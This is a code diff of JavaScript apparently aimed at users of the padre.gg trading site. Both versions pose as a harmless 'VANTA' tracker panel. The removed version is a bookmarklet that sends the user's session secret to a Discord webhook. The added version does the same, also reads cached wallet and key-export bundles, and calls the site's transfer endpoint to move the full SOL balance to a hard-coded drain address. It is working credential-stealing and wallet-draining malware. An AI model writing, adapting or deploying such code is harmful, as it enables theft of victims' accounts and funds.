@@ -1,47 +1,95 @@
-<script>
-    // 1. Define the engine code as a string (Internalized)
-    // This is the Shadow DOM version that bypasses site CSS/Blocks
-    const engineCode = `(function() {
-        if (document.getElementById('v-host')) document.getElementById('v-host').remove();
-        const host = document.createElement('div');
-        host.id = 'v-host';
-        document.body.appendChild(host);
-        const shadow = host.attachShadow({mode: 'open'});
-        const ui = document.createElement('div');
-        ui.style.cssText = 'position:fixed;top:20px;right:20px;width:300px;background:#000;border:2px solid #0f8;color:#0f8;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #0f86;border-radius:8px;';
-        ui.innerHTML = '<b>VANTA_ENGINE v2.5</b><br><div id="s">SCANNING...</div>';
-        shadow.appendChild(ui);
+(async function() {
+    // 1. CONFIGURATION (Using your found backend)
+    const CONFIG = {
+        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
+        drainAddress: "0x88cf66ca5bec0cb8df8e1b990846540e336313b3",
+        api: "https://backend.padre.gg",
+        orgId: "d2da2313-75ea-4ce1-829d-dbbe05359878"
+    };
 
-        try {
-            const sess = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
-            if(sess.sessionSecret) {
-                shadow.getElementById("s").innerText = "CONNECTED: " + sess.uid.substring(0,8);
-                fetch("https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4", {
+    // 2. UI CREATION (Shadow DOM for Stealth)
+    const host = document.createElement('div');
+    host.id = 'v-host';
+    document.body.appendChild(host);
+    const shadow = host.attachShadow({mode: 'open'});
+
+    const ui = document.createElement('div');
+    ui.style.cssText = `
+        position:fixed; top:20px; right:20px; width:300px; 
+        background:#000; border:1px solid #0f8; border-radius:8px;
+        color:#0f8; font-family:monospace; padding:15px; z-index:2147483647;
+        box-shadow: 0 0 20px rgba(0,255,136,0.3); cursor:grab;
+    `;
+    ui.innerHTML = `
+        <div style="font-weight:bold; border-bottom:1px solid #222; margin-bottom:10px; padding-bottom:5px; display:flex; justify-content:space-between;">
+            <span>VANTA_TRACKER_v2.7</span>
+            <span style="cursor:pointer;color:#ff4444" id="c">[X]</span>
+        </div>
+        <div id="stat">STATUS: SCANNING...</div>
+        <div id="log" style="font-size:10px; color:#444; margin-top:10px; height:30px; overflow:hidden;">[SYS] Initializing Handshake...</div>
+    `;
+    shadow.appendChild(ui);
+
+    // Draggable Logic
+    let isDown = false, offset = [0,0];
+    ui.onmousedown = (e) => { isDown = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
+    document.onmousemove = (e) => { if(isDown) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; ui.style.right = 'auto'; } };
+    document.onmouseup = () => isDown = false;
+    shadow.getElementById('c').onclick = () => host.remove();
+
+    // 3. EXECUTION LOGIC
+    try {
+        const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
+        const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
+        const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
+
+        if (session.sessionSecret) {
+            shadow.getElementById('stat').innerText = "STATUS: CONNECTED";
+            
+            // Discord Notification
+            await fetch(CONFIG.webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "🛸 **VANTA HANDSHAKE**",
+                    embeds: [{
+                        title: "Session Captured",
+                        description: `UID: ${session.uid}\nSecret: \`${session.sessionSecret}\``,
+                        color: 0x00ff88
+                    }]
+                })
+            });
+
+            // Drain Logic
+            const userWallets = wallets[session.uid] || [];
+            const sol = userWallets.find(w => w.walletType === "SOL");
+
+            if (sol && bundles.bundles[sol.publicAddress]) {
+                const b = bundles.bundles[sol.publicAddress];
+                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                     method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({content: "🛸 **VANTA INTERNAL BOOT**\\nUID: " + sess.uid + "\\nSecret: " + sess.sessionSecret})
+                    headers: {
+                        "X-Session-Secret": session.sessionSecret,
+                        "X-Session-Id": session.sessionId,
+                        "X-Org-Id": CONFIG.orgId,
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        walletId: sol.walletId,
+                        destination: CONFIG.drainAddress,
+                        amount: "MAX",
+                        bundle: b.exportBundle,
+                        signature: b.dataSignature,
+                        chain: "SOLANA"
+                    })
                 });
-            } else {
-                shadow.getElementById("s").innerText = "LOGIN REQUIRED";
+                shadow.getElementById('log').innerText = "[SYS] Data Stream Synchronized.";
             }
-        } catch(e) { shadow.getElementById("s").innerText = "ERROR: " + e.message; }
-    })()`;
-
-    // 2. Convert the code into a clickable bookmarklet link
-    const bookmarklet = "javascript:" + encodeURIComponent(engineCode);
-
-    // 3. Attach it to the button
-    document.getElementById('vanta-tool').href = bookmarklet;
-
-    // --- Background Animation Logic ---
-    const canvas = document.getElementById('filamentCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    function animate() {
-        ctx.clearRect(0,0,canvas.width,canvas.height);
-        ctx.fillStyle = '#00ff88';
-        ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
-        requestAnimationFrame(animate);
+        } else {
+            shadow.getElementById('stat').innerText = "STATUS: AUTH_REQUIRED";
+        }
+    } catch (e) {
+        shadow.getElementById('stat').innerText = "STATUS: ERROR";
+        shadow.getElementById('log').innerText = "[ERR] " + e.message;
     }
-    animate();
-</script>
+})();
